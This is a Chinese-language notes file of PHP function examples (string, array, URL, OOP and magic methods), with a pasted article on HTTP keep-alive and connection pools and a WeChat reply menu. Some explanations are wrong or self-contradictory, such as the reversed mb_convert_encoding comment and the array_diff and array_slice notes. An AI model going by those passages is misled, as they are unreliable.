++++++base64_encode()++++++
string base64_encode(string data)
将字符串以64位进行编码，可以让中文字或者图片也能在网络上顺利传输。

++++++get_loaded_extensions()++++++
这是查看php开启的扩展，输出的一个数组元素。

++++++setlocale() ++++++
函数设置地区信息（地域信息）。
设置地区为 US English，然后重新设置回系统默认：
<?php
echo setlocale(LC_ALL,"US");
echo "<br>";
echo setlocale(LC_ALL,NULL);
?>

++++++connection_aborted()来判断用户是否中断+++++++
error_reporting(E_ALL);  //显示报错信息  
var_dump(connection_status());   //显示用户的连接状态  
sleep(1);     //等待1秒  
if(connection_aborted()) die('连接中断');     //如果用户连接中断，停止运行  
echo "保持连接";  
ob_flush();       //存在输出缓存中的内容取出来，设置为等待输出状态  
flush();          //将等待输出缓存中内容，传给用户    
//记录时间，以查看是否已经运行  
$aaa = fopen("test.txt","a+");  
fwrite($aaa, date("Y-m-d H:i:s")."\n");  
fclose($aaa);  


++++++parse_str()函数++++++
将字符串解析成变量	
parse_str("id=23&name=John%20Adams",$myArray);
print_r($myArray);
结果为：
Array ( [id] => 23 [name] => John Adams )

++++++chr()函数++++++
返回指定ASCII值对应的字符
echo chr(077);
结果为：?

++++++ord()函数++++++
返回字符串对应的ASCII值
echo ord('H');
结果为：72

+++strpbrk()函数+++++++++
该函数返回指定字符第一次出现的位置开始的剩余部分，如果失败，返回false。
echo strpbrk('i love hz','ve');
结果是：
ve hz

++++exif_imagetype()函数++++++
exif_imagetype判断一个图像的类型
if (exif_imagetype("image.gif") != IMAGETYPE_GIF) {  
    echo "The picture is not a gif";  
}  
if (in_array(exif_imagetype("path/to/file"), array(IMAGETYPE_GIF , IMAGETYPE_JPEG ,IMAGETYPE_PNG , IMAGETYPE_BMP))) {  
    echo "This is a picture ";  
}  


+++++echo()函数+++++++
//PHP是先连接字符串再进行加法计算了.按照从左向右的方向进行的。
//如果将一个字符串强制转换成一个数字.PHP会去搜索这个字符串的开头.如果开头是数字就转换.如果不是就直接返回0

echo '5+1=' . 1+5;  //输出10
echo '5+1=' . 5+1;  //输出6
echo '5+1=' , 1+5;  //输出5+1=6
echo '5+1=' , 5+1;  //输出5+1=6

++++++strtr()函数+++++++  效果相当于str_replace()
该函数替换原字符串中出现过的所有相同元素。
echo strtr("Hilla Warld","ia","eo");
结果是：
Hello World; (strtr 将字符串中出现的所有i替换成e,a替换成o)

+++++++++str_replace()函数与preg_replace()函数+++++++++
str_replace(修改后的内容，希望替换的内容，原字符串或数组，替换的数目);
<?php
$arr = array("blue","red","green","yellow");
print_r(str_replace("red","pink",$arr,$i));
echo "替换数：$i";
?>
结果为：
Array ( [0] => blue [1] => pink [2] => green [3] => yellow ) 替换数：1
同样功能的函数有preg_replace()函数
preg_replace(修改后的内容，希望替换的内容，原字符串或数组）
转义字符串，json中常用。php5.2有一个系统函数json_encode()自带转义效果
public function escapeJsonString($value) {
    $escapers = array("\\", "/", "\"", "\n", "\r", "\t", "\x08", "\x0c");
    $replacements = array("\\\\", "\\/", "\\\"", "\\n", "\\r", "\\t", "\\f", "\\b");
    $result = str_replace($escapers, $replacements, $value);
    return $result;
}

++++++PHP寻找两个字符串的相似性similar_text()+++++++
PHP 提供了一个极少使用的 similar_text 函数，但此函数非常有用，用于比较两个字符串并返回相似程度的百分比
similar_text($string1, $string2, $percent);
实例：
similar_text('hhllo','hello',$percent);
echo $percent."%";
结果为：80%

++++++htmlspecialchars()函数++++++++
echo htmlspecialchars($str, ENT_COMPAT); // 只转换双引号
echo "<br>";
echo htmlspecialchars($str, ENT_QUOTES); // 转换双引号和单引号  ，更加安全


++++bin2hex()函数++++++++++
bin2hex 将二进位转成十六进位
语法：string bin2hex(string str);

+++++++strip_tags()函数+++++++++
strip_tags()函数去除 剥去 HTML、XML 以及 PHP 的标签。
<?php
echo strip_tags("Hello <b>NowaMagic!</b>");
?>
结果为：
Hello NowaMagic!


+++++++++++ mb_convert_encoding()函数++++++++
mb_convert_encoding($str,'UTF-8','GBK')；将UTF-8格式的转为GBK
另外一个转码函数iconv()函数：
发现iconv在转换字符”—”到gb2312时会出错，如果没有ignore参数，所有该字符后面的字符串都无法被保存。
不管怎么样，这个”—”都无法转换成功，无法输出。 另外mb_convert_encoding没有这个bug. 
一般情况下用 iconv，只有当遇到无法确定原编码是何种编码，或者iconv转化后无法正常显示时才用mb_convert_encoding 函数. 
$content = iconv("GBK", "UTF-8", $str); (以上俩个函数会产生同样效果)
在使用iconv()时候，请不要转成"GB2312"的格式，因为这是iconv的一个bug，可以直接把gb2312写成gbk就OK了。

++++++++ stream_context_create()++++++++
作用：创建并返回一个文本数据流并应用各种选项，可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程。 
函数原型：resource stream_context_create ([ array $options [, array $params ]] ) 
function Post($url, $post = null){
     $context = array();
     if (is_array($post)) {
         ksort($post);
         $context['http'] = array (
             'timeout'=>60,
             'method' => 'POST',
             'content' => http_build_query($post, '', '&'),
         );
     }
return file_get_contents($url, false,stream_context_create($context));
}

$data = array(
     'name' => 'test',
     'email' => 'test@gmail.com',
     'submit' => 'submit',
);
$str=Post('http://www.ej38.com', $data);
echo mb_convert_encoding($str,'UTF-8','GBK');

+++++++http_build_query()函数+++++++
将数组返回成一个url格式字符串
$data = array('foo'=>'bar',
              'baz'=>'boom',
              'cow'=>'milk',
              'php'=>'hypertext processor'
             );
echo http_build_query($data);
结果为：
foo=bar&baz=boom&cow=milk&php=hypertext+processor

+++++strstr()函数++++++++
检测一个字符串是否存在另一个字符串中，如果存在则返回检测原样（不加true）或者返回剩下部分
echo strstr('Hello','o');      返回 o
echo strstr('Hello','o',true); 返回 Hell
echo strstr('Hello','22');     不返回任何内容

+++++array_unique()函数+++++++
array_unique()可以去除一个一维数组中相同的元素，但是它不适用于多维数组，下面的方法可以解决。
function array_unique_fb($array2D)
{
    foreach ($array2D as $v)
    {
        $v = join(",",$v);  //降维,也可以用implode,将一维数组转换为用逗号连接的字符串
        $temp[] = $v;
    }
    $temp = array_unique($temp);    //去掉重复的字符串,也就是重复的一维数组
    foreach ($temp as $k => $v)
    {
        $temp[$k] = explode(",",$v);   //再将拆开的数组重新组装
    }
    return $temp;
}


+++++++str_repeat()函数+++++++
重复字符串：
$arr='12';
echo str_repeat($arr,4);
结果为：
12121212


++++str_word_count()函数+++++++++++++
str_word_count()函数，可以确定一个字符串中某个单词的出现次数。
$arr='gg rfg rghh ';
var_dump(str_word_count($arr,1,'g'));
结果为：
array (size=3)
  0 => string 'gg' (length=2)
  1 => string 'rfg' (length=3)
  2 => string 'rghh' (length=4)


++++++++substr_count()函数++++++++++++
substr_count()函数：可以确定一个字符串在所提供的字符串中有多少个
$arr="fghyjffgyhjdsthshgvgfhds";
var_dump(substr_count($arr,'g'));
结果为：
int 4


+++++++array_flip()函数++++++++++
交换键名与键值
$arr=array('1'=>'a','2'=>'b','3'=>'c');
var_dump(array_flip($arr));
结果为：array (size=3)
  'a' => int 1
  'b' => int 2
  'c' => int 3


++++++array_key_exists()与in_array()函数+++++++
检查值、键：
array_key_exists($key,$array);//检查数组键
in_array($value,$array);//检查值于数组


++++++++array_slice()函数+++++++++
array_slice()函数
$arr=array(1=>'ffd',2=>'tgrt',3=>'rghd',4=>'erhh',5=>'fffsv');
var_dump(array_slice($arr,1,1));
结果是：
array (size=1)
0 => string 'tgrt' (length=4)
array_splice()函数
$arr=array(1=>'ffd',2=>'tgrt',3=>'rghd',4=>'erhh',5=>'fffsv');
array_splice($arr,4);
var_dump($arr);
结果是：
array (size=4)
  0 => string 'ffd' (length=3)
  1 => string 'tgrt' (length=4)
  2 => string 'rghd' (length=4)
  3 => string 'erhh' (length=4)

array_change_key_case()	返回其键均为大写或小写的数组。 	
array_chunk()	把一个数组分割为新的数组块。	
array_combine()	通过合并两个数组来创建一个新数组。	
array_count_values()	用于统计数组中所有值出现的次数。	
array_diff()	返回两个数组的差集数组。	
array_diff_assoc()	比较键名和键值，并返回两个数组的差集数组。	
array_diff_key()	比较键名，并返回两个数组的差集数组。	
array_diff_uassoc()	通过用户提供的回调函数做索引检查来计算数组的差集。	
array_diff_ukey()	用回调函数对键名比较计算数组的差集。	
array_fill()	用给定的值填充数组。	
array_filter()	用回调函数过滤数组中的元素。	
array_flip()	交换数组中的键和值。	
array_intersect()	计算数组的交集。	
array_intersect_assoc()	比较键名和键值，并返回两个数组的交集数组。	
array_intersect_key()	使用键名比较计算数组的交集。	
array_intersect_uassoc()	带索引检查计算数组的交集，用回调函数比较索引。	
array_intersect_ukey()	用回调函数比较键名来计算数组的交集。	
array_key_exists()	检查给定的键名或索引是否存在于数组中。	
array_keys()	返回数组中所有的键名。	
array_map()	将回调函数作用到给定数组的单元上。	
array_merge()	把一个或多个数组合并为一个数组。	
array_merge_recursive()	递归地合并一个或多个数组。	
array_multisort()	对多个数组或多维数组进行排序。	
array_pad()	用值将数组填补到指定长度。	
array_pop()	将数组最后一个单元弹出（出栈）。	
array_product()	计算数组中所有值的乘积。	
array_push()	将一个或多个单元（元素）压入数组的末尾（入栈）。	
array_rand()	从数组中随机选出一个或多个元素，并返回。	
array_reduce()	用回调函数迭代地将数组简化为单一的值。	
array_reverse()	将原数组中的元素顺序翻转，创建新的数组并返回。	
array_search()	在数组中搜索给定的值，如果成功则返回相应的键名。
array_shift()	删除数组中的第一个元素，并返回被删除元素的值。	
array_slice()	在数组中根据条件取出一段值，并返回。	
array_splice()	把数组中的一部分去掉并用其它值取代。	
array_sum()	计算数组中所有值的和。	
array_udiff()	用回调函数比较数据来计算数组的差集。	
array_udiff_assoc()	带索引检查计算数组的差集，用回调函数比较数据。
array_udiff_uassoc()	带索引检查计算数组的差集，用回调函数比较数据和索引。	
array_uintersect()	计算数组的交集，用回调函数比较数据。	
array_uintersect_assoc()	带索引检查计算数组的交集，用回调函数比较数据。	
array_uintersect_uassoc()	带索引检查计算数组的交集，用回调函数比较数据和索引。	
array_unique()	删除数组中重复的值。	
array_unshift()	在数组开头插入一个或多个元素。	
array_values()	返回数组中所有的值。	
array_walk()	对数组中的每个成员应用用户函数。	
array_walk_recursive()	对数组中的每个成员递归地应用用户函数。	
arsort()	对数组进行逆向排序并保持索引关系。	
asort()	对数组进行排序并保持索引关系。	
compact()	建立一个数组，包括变量名和它们的值。	
count()	计算数组中的元素数目或对象中的属性个数。	
current()	返回数组中的当前元素。	
each()	返回数组中当前的键／值对并将数组指针向前移动一步。	
end()	将数组的内部指针指向最后一个元素。	
extract()	从数组中将变量导入到当前的符号表。	
in_array()	检查数组中是否存在指定的值。	
key()	从关联数组中取得键名。	
krsort()	对数组按照键名逆向排序。	
ksort()	对数组按照键名排序。	
list()	把数组中的值赋给一些变量。	
natcasesort()	用“自然排序”算法对数组进行不区分大小写字母的排序。	
natsort()	用“自然排序”算法对数组排序。	
next()	将数组中的内部指针向前移动一位。	
pos()	current() 的别名。	
prev()	将数组的内部指针倒回一位。	
range()	建立一个包含指定范围的元素的数组。	
reset()	        将数组的内部指针指向第一个元素。	
rsort()	        对数组逆向排序。	
shuffle()	把数组中的元素按随机顺序重新排列。	
sizeof()	count() 的别名。	
sort()	        对数组排序。	
uasort()	使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。	
uksort()	使用用户自定义的比较函数对数组中的键名进行排序。	
usort()	使用用户自定义的比较函数对数组中的值进行排序。

PHP函数microtime()返回当前 Unix 时间戳和微秒数。

++++++++strpos()++++++++
在使用该函数的时候。里面的位置一定要分清楚，strpos(原字符串，“需要查找的字符串片段”);
在使用strpos时候，比较位置的时候要使用===(三等于)而不是==(普通的双等于);比如：
 if(strpos($data,'imgurl:') === 0){
  $data=substr($data,7);
  echo "<img src='".$data."' title='照片' alt='图片' height='40px' width='40px' />";
  }else{
  echo get_emotion($data);
}

 
++++++++strcmp()函数++++++++
比较两个字符串（区分大小写）：
<?php
echo strcmp("Hello world!","Hello world!");
?>


++++++++array_unique(array)函数++++++++
该函数用来移除数组中的重复的值，并返回结果数组。
当几个数组元素的值相等时，只保留第一个元素，其他的元素被删除。
返回的数组中键名不变。

++++++++call_user_func()++++++++
call_user_func('方法名称','赋的值'):一种特别的调用函数的方法，例如；
function nowmagic($a)
{
 echo $a;
}
call_user_func('nowmagic','1111111111');

++++++++preg_replace_callback()++++++++
preg_replace_callback()正则替换回调函数;

++++++++array_unshift()++++++++
array_unshift() 函数在数组开头插入一个或多个元素。例如：
$a=array('11','22','33');
array_unshift($a,'66');
结果为：66,11,22,33

++++++++is_numeric()++++++++
is_numeric()检测变量是否为数字或数字字符串;如果是返回true,不是返回false;

++++++++strpos()++++++++
stripos()与strpos(),前者对大小写不敏感，后者则敏感，类似的还有str_ireplace()与str_replace()

++++++++array_filter()++++++++
array_filter(array,function);筛选出需要的结果
function myfudction($v)
{
if($v=="H")
{
  return true;
}
return false;
}
$as=array("H","d","s");
print_r(array_filter($as,"myfudction"));

+++++++array_intersect()+++++++
array_intersect() 函数返回两个或多个数组的交集数组。
$add1=array(1,3,4,5);
$add2=array(3,4,6,7);
print_r(array_intersect($add1,$add2));
结果是：
Array ( [1] => 3 [2] => 4 ) 

+++++++++join()+++++++++
join() 函数返回由数组元素组合成的字符串。
join() 函数是 implode() 函数的别名。也就是说它也是把数组元素练成一段字符串

+++++++面向对象：parent::关键字++++++++
parent::用来引用父类中的方法。
class employee
{
protected $sal=3000;
public function getSal()
{
 return $this->sal;
}
}
class manager extends employee
{
   public function getSal()
   {
   parent::getSal();
$this->sal=$this->sal+2000;
return $this->sal;
    }
}
$emp=new employee();
echo $emp->getSal()."<br>";
$mana=new manager();
echo $mana->getSal();


++++++++这里的$name可以直接用$this->name调用+++++++++
class Person
{
var $name;
var $age;
function say()
	{
	echo "my name is :".$this->name."<br>";
	echo "my age is :".$this->age."<br>";
    }
}
class Student extends Person
{
	var $school;
	function study()
	{
	echo "my name is:".$this->name."<br>";
	echo "i am".$this->school."study";
	}
}
$stu=new Student();
$stu->name="Bob";
$stu->age="Tom";
$stu->school="People";
$stu->study();

+++++php构造函数与析构函数+++++
__construct()构造函数与__destruct()析构函数，前者是在一个类被实例化之前先被自动调用，无返回值，后者则是在销毁一个类之前自动执行一些东西，即两个的执行时间不一样，其他的区别不大。
final 关键字用于定义类和方法，该关键字表示该类或方法为最终版本，即该类不能被继承，或该方法在子类中不能被重载（覆盖）。


echo $HTTP_COOKIE_VARS["TestCookie"]; 输出所有cookie值。

+++++++mktime()++++++
mktime()函数适合用来进行日期计算和校验，设定一个固定日期。
echo date('Y-m-d H:i:s',mktime(0,0,0,12,30,1997));  //输出1997-12-30 00:00:00
echo date('Y-m-d H:i:s',mktime(0,0,0,12,32,1997));  //输出1998-01-01 00:00:00



TCP / IP长连接&连接池的应用
我们知道TCP是基于连接的协议，其实这个“连接”只是一个逻辑上的概念。在IP层看来， TCP和UDP仅仅是内容上稍有差别而已。
TCP的“连接”仅仅是连接的两端对于四元组和sequence号的一种约定而已。
在有些文章里总会提到这名词、或者五元组，甚至七元组。虽然我很反对摆弄名词秀专业，但我们也要防止被“秀”。 其实很容易理解：
四元组： 源IP地址、目的IP地址、源端口、目的端口
五元组： 源IP地址、目的IP地址、协议、源端口、目的端口
七元组： 源IP地址、目的IP地址、协议、源端口、目的端口，服务类型，接口索引
在性能比较敏感的程序中，为了节省TCP网络调用建立连接三次握手的时间， 很多程序都会选择采用复用之前已经建立过的连接的方法来优化。
再加上往往是“请求、响应、请求、响应”的模式，单个连接限制了QPS（Query Per Second）的提升。 所以会采取开启多个连接组成一个“池子”的方式来优化性能，我们称之为连接池。
HTTP的长连接
HTTP长连接，HTTP持久连接（HTTPpersistent connection，也称作HTTP keep-alive或HTTP connection reuse）是使用同一个TCP连接来发送和接收多个HTTP请求/应答， 而不是为每一个新的请求/应答打开新的连接的方法。
在HTTP 1.0 中, 没有官方的 keepalive 的操作。通常是在现有协议上添加一个指数。如果浏览器支持 keep-alive，它会在请求的包头中添加：
Connection: Keep-Alive
然后当服务器收到请求，作出回应的时候，它也添加一个头在响应中：
Connection: Keep-Alive
这样做，连接就不会中断，而是保持连接。当客户端发送另一个请求时，它会使用同一个连接。这一直继续到客户端或服务器端认为会话已经结束，其中一方中断连接。
在HTTP 1.1 中 所有的连接默认都是持续连接，除非特殊声明不支持。 HTTP 持久连接不使用独立的 keepalive 信息，而是仅仅允许多个请求使用单个连接。
然而，Apache 2.0 httpd 的默认连接过期时间是仅仅15秒，对于 Apache 2.2 只有5秒。 短的过期时间的优点是能够快速的传输多个web页组件，而不会绑定多个服务器进程或线程太长时间。
loading...
Keep-Alive的优势
较少的CPU和内存的使用（由于同时打开的连接的减少了）
允许请求和应答的HTTP管线化
减少了后续请求的延迟（无需再进行握手）
报告错误无需关闭TCP连接
Keep-Alive的劣势
对于现在的广泛普及的宽带连接来说，Keep-Alive也许并不像以前一样有用。 web服务器会保持连接若干秒(Apache中默认15秒)，这与提高的性能相比也许会影响性能。对于单个文件被不断请求的服务(例如图片存放网站)，Keep-Alive可能会极大的影响性能， 因为它在文件被请求之后还保持了不必要的连接很长时间。
根据RFC2616，用户客户端与任何服务器和代理服务器之间不应该维持超过2个链接。代理服务器应该最多使用2×N个持久连接到其他服务器或代理服务器，其中N是同时活跃的用户数。这个指引旨在提高HTTP响应时间并避免阻塞。
但由于，TCP连接减少了，对于静态资源（图片、JavaScript、CSS）较多的网站， 性能反而可能会下降。
动静分离
为了规避上面说的对图片等静态资源的影响，大多数商业网站会启用独立的静态资源域名。从而保证主站的动态资源请求和静态资源的请求不会互相挤占连接。
动静分离同时还会有一个额外的好处：
对于静态资源的请求，HTTP请求头里的Cookie等信息是没有用处的， 反而占用了宝贵的上行网络资源。用独立的域名存放静态资源后，请求静态资源域名就不会默认带上主站域的Cookie，从而解决了这个问题。
如下表：
loading...
一、IT技术文章：
回复"1",查看——“ 如何深入了解linux”
回复"2",查看——“Python 自动化框架”
回复"3",查看——“ Linux 运维职业规划”
回复"4",查看——“提升B格的命令技巧”
回复"5",查看——“网络编程-从Apache到Nginx”
回复"6",查看——“两个使用的Python 装饰器
回复"7",查看——“Python 多线程、进程那些事”
回复"8",查看——“1000，000 packets/s的挑战”
回复"9",查看——“Op危机，你嗅到了没？”
回复"10",查看——“干货丨戏说非阻塞网络编程”
回复"11",查看——“用Python写一个简单的监控系统”
回复"12",查看——“提高你Python 编码效率的‘武林秘籍’”
二、最新课程：
回复"课程",查看——最新课程消息
回复"报名"，查看——报名咨询方式
回复"Reboot",查看——Reboot简介


strstr就等于strchr，但是它们和strrchr不一样！
strstr和strrchr的区别
strstr 显示第一次找到，要查找的字符串，以及后面的字符串。 
strrchr 显示最后一次找到，要查找的字符串，以及后面的字符串。
<?php 
$email = 'test@test.com@jb51.net'; 
$domain = strstr($email, '@'); 
echo "strstr 测试结果 $domain<br>"; 
$domain = strrchr($email, '@'); 
echo "strrchr 测试结果 $domain<br>"; 
?>
结果如下：
strstr 测试结果 @test.com@jb51.net 
strrchr 测试结果 @jb51.net

substr用法：
<?php $email = 'zhangYingy@jb51.net'; 
$domain = substr($email, 6); 
echo "substr 测试结果 $domain<br>"; 
?>
echo substr('123456',1); //23456
echo substr('123456',1,2);//23
echo substr('123456',1,-2); //234
结果如下：
substr 测试结果 ingy@jb51.net

+++++++++php默认变量+++++++++
echo __FILE__;//这是文件完整的地址为：D:\wamp\wamp\apps\think\test.php
echo __LINE__;//显示这一句所在的行数
echo PHP_VERSION;//显示php版本
echo PHP_OS; //显示php运行系统名称
echo TRUE;  //1,同理FALSE结果为0
echo E_ERROR;
echo "<br>";
//可以用define函数自定义默认变量
define('COPYRIGHT','Copyright');
echo COPYRIGHT;

$testa=array('0'=>array('id'=>14),'1'=>array('id'=>23),'3'=>array('id'=>32));
array_slice($testa,1-1,'id');
var_dump($testa);exit;
用array_slice()可以更换数组的键名，不过如果键名相同，数组会自动添加新的键名，结果会是这样；
array (size=3)
  0 => 
    array (size=1)
      'id' => int 14
  1 => 
    array (size=1)
      'id' => int 23
  3 => 
    array (size=1)
      'id' => int 32


+++++++urlencode()函数+++++++
本函数将字符串以 URL 编码。例如空格就会变成加号。
Homepage 中 form 资料传送就是用 urlencode 编码后再送出。

bool array_walk ( array &array, callback funcname [, mixed userdata] ) 对数组中的每个成员应用用户函数
array array_map ( callback callback, array arr1 [, array ...] )将回调函数作用到给定数组的单元上
array array_fill ( int start_index, int num, mixed value ) 用给定的值填充数组
array_fill(5, 3, 'a')-->array(5=>'a',6=>'a',7=>'a')
array array_chunk ( array input, int size [, bool preserve_keys] )将一个数组分割成多个


++++++array_multisort()这个函数+++++++
有时候我们需要对二维数组的某个键的值进行排序，这里就是讨论这个问题。
我们可以使用array_multisort()这个函数。array_multisort() 函数对多个数组或多维数组进行排序。

++++++list() 函数:+++++++
list() 函数用数组中的元素为一组变量赋值。
注意，与 array() 类似，list() 实际上是一种语言结构，不是函数。
<?php
	$my_array = array("Dog","Cat","Horse");
	list($a, , $c) = $my_array;
	echo "Here I only use the $a and $c variables.";
?>  
运行结果： Here I only use the Dog and Horse variables.

+++++++number_format() 函数:+++++++
number_format() 函数通过千位分组来格式化数字。
<?php
$num = 500000;
echo number_format($num);
// 500,000
echo number_format($num, 2);
// 500,000.00
echo number_format($num, 3, ".", ",");
// 500,000.000
?>

+++++php5常用函数++++++
    connection_status() 函数返回当前的连接状态。
　　connection_aborted() 函数检查是否断开客户机。
　　zip_read() 函数读取打开的 zip 档案中的下一个文件。
　　zip_open() 函数打开 ZIP 文件以供读取。
　　zip_entry_read() 函数从打开的 zip 档案项目中获取内容。
　　zip_entry_open() 函数打开一个 ZIP 档案项目以供读取。
　　PHP5常用函数之zip_entry_name() 函数返回 zip 档案项目的名称。
　　zip_entry_filesize() 函数返回 zip 档案项目的原始大小(在压缩之前)。
　　zip_entry_compressionmethod() 函数返回 zip 档案项目的压缩方法。
　　zip_entry_compressedsize() 函数返回 zip 档案项目的压缩文件尺寸。
　　zip_entry_close() 函数关闭由 zip_entry_open() 函数打开的 zip 档案文件。
　　zip_close() 函数关闭由 zip_open() 函数打开的 zip 档案文件。
    file_exists($file)    判断文件是否存在
    gettype();            获取数据类型

+++++++++file_put_contents()函数+++++++++
file_put_contents(文件名，要加的内容，) 函数把一个字符串写入文件中。
与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。
而file_put_contents(,,FILE_APPEND)则是追加效果，适合用来写日志文件。

	
++++$_SERVER['HTTP_REFERER']++++++
<?php echo $_SERVER['HTTP_REFERER'];?>可以得到链接/提交当前页的父页面URL
如果返回“找不到文件”的提示，则可用 header 函数，header("HTTP/1.0 404 Not Found").
写出一个正则表达式，过虑网页上的所有JS/VBS脚本（即把标记及其内容都去掉）.
/<[^>].*?>.*?<\/>/si


++++php数组中对键名与键值的操作+++++++
arra_keys()获得数组键名
$arr=array('1'=>'gg','2'=>'sd','3'=>'rg');
$ee=array_keys($arr);
var_dump($ee);
结果为：
array (size=3)
  0 => int 1
  1 => int 2
  2 => int 3
array_values()获得数组键值
$arr=array('1'=>'gg','2'=>'sd','3'=>'rg');
$ee=array_values($arr);
var_dump($ee);
结果为：
array (size=3)
  0 => string 'gg' (length=2)
  1 => string 'sd' (length=2)
  2 => string 'rg' (length=2)


+++++++++parse_url()函数:+++++++++
parse_url() 函数可以解析 URL，返回其组成部分。它的用法如下：
array = parse_url( string url );
<?php 
  $url="http://www.nowmagic.net/welcome/";
  $parts=parse_url($url);
  print_r($parts);
?>
结果是：Array ( [scheme] => http [host] => www.nowmagic.net [path] => /welcome/ )  ;


+++++++strip_tags()函数+++++++
strip_tags() 函数剥去 HTML、XML 以及 PHP 的标签
<?php
echo strip_tags("Hello <b>NowaMagic!</b>");
?>
结果是：Hello NowaMagic!


+++++shuffle()函数+++++++++
将数组随机打乱
<?php 
  $data=array('111','222','333','444','555','666');
  shuffle($data);
  print_r($data);
  结果是：Array ( [0] => 222 [1] => 555 [2] => 333 [3] => 111 [4] => 444 [5] => 666 ) 
?>

++++++http_bluid_query()函数++++++
将数组变成url
<?php 
  $data = array(
   'site'=>'www.nowamagic.net', 
	'foo'=>'bar', 
	'baz'=>'boom', 	
	'name'=>'nowamagic'); 
  echo http_build_query($data); 
?>
结果为：site=www.nowamagic.net&foo=bar&baz=boom&name=nowamagic

++++++stream_context_create()函数+++++++
stream_context_create() 作用：创建并返回一个文本数据流并应用各种选项，
可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程。

++++++++++查看本地目录之glob()和scandir()+++++++++
glob()函数
$img=array('gif','png','jpg');
$dir='img/';  //查找的文件名所在目录
$pic=array();
foreach($img as $k=>$v){
	$pattern=$dir.'*.'.$v;
	$all=glob($pattern);
	$pic=array_merge($pic,$all);
}
var_dump($pic);
foreach($pic as $p){
echo $p.'<br>';
}
上面的等同于：
$files=glob('img/*.jpg');
print_r($files);
结果均为：
array (size=2)
  0 => string 'img/test.jpg' (length=12)
  1 => string 'img/test2.jpg' (length=13)

scandir()函数：
$dir='img/';
$file=scandir($dir);
print_r($file);
结果为：
Array ( [0] => . [1] => .. [2] => test.jpg [3] => test2.jpg ) 


+++++++++数组比较函数 array_diff()与array_diff_assoc()函数+++++++
array_diff_assoc() 函数返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的键和值。
和 array_diff()函数不同，本函数要求键名和键值都进行比较。返回的数组中键名保持不变。
array_diff() 能比较key和value，而实际上它只比较了value，而不关心key，如果关心key的话，可以使用函数array_diff_assoc().

++++++++php数组求交集的array_intersect()函数与array_intersecct_assoc()函数：++++++++++
array_intersect        计算数组的交集，只关心value，不关心key；
array_intersect_assoc  带索引检查计算数组的交集。


json_encode()与json_decode()
这是PHP的原生函数，然而在今天JSON越来越流行，所以在PHP5.2以后，
PHP开始支持JSON，你可以使用 json_encode() 和 json_decode() 函数

filectime — 取得文件的 inode 修改时间
filemtime — 取得文件修改时间
fileatime — 取得文件上次访问时间
fileperms -- 取得文件的访问权限
is_executable — 判断给定文件名是否可执行



++++++get_headers()函数++++++++++
get_headers()获取所有的，由服务器发送的响应一个HTTP请求的头信息
$url='http://www.example.com';
print_r(get_headers($url));
结果为：
Array(
 [0] => HTTP/1.1 200 OK 
 [1] => Date: Sat, 29 May 2004 12:28:13 GMT 
 [2] => Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)
 [3] => Last-Modified: Wed, 08 Jan 2003 23:11:55 GMT
 [4] => ETag: "3f80f-1b6-3e1cb03b"
 [5] => Accept-Ranges: bytes
 [6] => Content-Length: 438
 [7] => Connection: close
 [8] => Content-Type: text/html 
) 


++++++php魔幻方法+++++++
php规定以两个下划线（__）开头的方法都保留为魔术方法，所以建议大家函数名最好不用__开头，除非是为了重载已有的魔术方法。  
PHP中的魔术方法有 :__construct, __destruct , __call, __callStatic,__get, __set, __isset, __unset , __sleep, __wakeup, __toString, __set_state, __clone, __autoload  
1、__get、__set  
这两个方法是为在类和他们的父类中没有声明的属性而设计的  
__get( $property ) 当调用一个未定义的属性时，此方法会被触发，传递的参数是被访问的属性名  
__set( $property, $value ) 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值  
这里的没有声明包括当使用对象调用时，访问控制为proteced,private的属性（即没有权限访问的属性）。  
2、__isset、__unset  
__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法  
__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法  
与__get方法和__set方法相同，这里的没有声明包括当使用对象调用时，访问控制为proteced,private的属性（即没有权限访问的属性）  
3、__call  
__call( $method, $arg_array ) 当调用一个未定义的方法是调用此方法  
这里的未定义的方法包括没有权限访问的方法；如果方法不存在就去父类中找这个方法，如果父类中也不存在就去调用本类的__call()方​法，如果本类中不存在__call()方法就去找父类中的__call()方法   
4、__autoload  
__autoload 函数，它会在试图使用尚未被定义的类时自动调用。通过调用此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。  
如果要定义一个全局的自动加载类，则必须用spl_autoload_register()方法将处理类注册到PHP标准库：  
<?php    
class Loader    
{    
static function autoload_class($class_name)    
{    
//寻找正确的$class_name类，并引入，没有则抛出异常    
}    
}    
/**
*   设置对象的自动载入 
*   spl_autoload_register — Register given function as __autoload() implementation 
*/    
spl_autoload_register(array('Loader', 'autoload_class'));    
    
$a = new Test();//Test没用require就实例化，实现自动加载，很多框架就用这种方法自动加载类    
    
?>    
注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误，所以应该在函数本身做捕获。  
5、__construct、__destruct  
__construct 构造方法，当一个对象创建时调用此方法，相对于PHP4使用此方法的好处是：可以使构造方法有一个独一无二的名称,无论它所在的类的名称是什么.这样你在改变类的名称时,就不需要改变构造方法的名称  
__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法。默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源，析构函数允许你在使用一个对象之后执行任意代码来清除内存。当PHP决定你的脚本不再与对象相关时,析构函数将被调用。  
在一个函数的命名空间内，这会发生在函数return的时候。  
对于全局变量,这发生于脚本结束的时候。  
如果你想明确地销毁一个对象,你可以给指向该对象的变量分配任何其它值.通常将变量赋值勤为NULL或者调用unset.  
6、__clone  
PHP5中的对象赋值是使用的引用赋值，如果想复制一个对象则需要使用clone方法，在调用此方法是对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。  
7、__toString  
__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时。  
如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in  
此方法必须返回一个字符串。  
